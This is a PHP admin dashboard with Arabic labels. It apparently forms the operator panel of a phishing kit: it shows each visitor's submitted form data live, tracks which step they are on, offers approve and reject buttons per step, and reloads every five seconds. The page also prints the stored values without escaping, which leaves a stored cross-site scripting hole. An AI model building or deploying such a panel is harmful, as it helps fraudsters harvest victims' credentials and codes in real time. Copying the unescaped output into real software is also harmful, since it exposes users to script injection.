<?php
session_start();
require_once '../../includes/db.php';
require_once '../../includes/functions.php';

if (!isset($_SESSION['admin_logged_in'])) {
    header("Location: login.php");
    exit;
}

$stmt = $pdo->query("SELECT * FROM visitors ORDER BY last_activity DESC");
$visitors = $stmt->fetchAll();

?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم المتطورة</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f4f7f6; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .sidebar { height: 100vh; background: #2c3e50; color: white; padding-top: 20px; }
        .main-content { padding: 20px; }
        .visitor-card { background: white; border-radius: 10px; padding: 15px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .status-waiting { color: orange; font-weight: bold; }
        .status-approved { color: green; font-weight: bold; }
        .status-rejected { color: red; font-weight: bold; }
    </style>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <nav class="col-md-2 d-none d-md-block sidebar">
            <h4 class="text-center">الأدمن</h4>
            <hr>
            <ul class="nav flex-column">
                <li class="nav-item"><a class="nav-link text-white" href="#">الرئيسية</a></li>
                <li class="nav-item"><a class="nav-link text-white" href="logout.php">تسجيل الخروج</a></li>
            </ul>
        </nav>
        <main class="col-md-10 main-content">
            <h2>الزوار الحاليين والبيانات اللحظية</h2>
            <div id="visitors-list">
                <?php foreach ($visitors as $v): ?>
                <div class="visitor-card">
                    <div class="row align-items-center">
                        <div class="col-md-3">
                            <strong>المعرف:</strong> <?php echo $v['visitor_id']; ?><br>
                            <strong>الخطوة:</strong> <?php echo $v['current_step']; ?>
                        </div>
                        <div class="col-md-4">
                            <strong>البيانات:</strong><br>
                            <?php
                            $stmt_data = $pdo->prepare("SELECT field_name, field_value FROM client_data WHERE visitor_id = ?");
                            $stmt_data->execute([$v['visitor_id']]);
                            $data = $stmt_data->fetchAll();
                            foreach ($data as $d) {
                                echo "<span>" . $d['field_name'] . ": " . $d['field_value'] . "</span> | ";
                            }
                            ?>
                        </div>
                        <div class="col-md-2">
                            <strong>الحالة:</strong> <span class="status-<?php echo $v['status']; ?>"><?php echo $v['status']; ?></span>
                        </div>
                        <div class="col-md-3 text-end">
                            <?php if ($v['current_step'] !== 'index'): ?>
                            <button class="btn btn-success btn-sm" onclick="updateStatus('<?php echo $v['visitor_id']; ?>', 'approved')">قبول</button>
                            <button class="btn btn-danger btn-sm" onclick="updateStatus('<?php echo $v['visitor_id']; ?>', 'rejected')">رفض</button>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </main>
    </div>
</div>

<script>
    function updateStatus(id, status) {
        fetch('../api/update_visitor.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `visitor_id=${id}&status=${status}`
        }).then(() => location.reload());
    }
    setInterval(() => location.reload(), 5000);
</script>
</body>
</html>
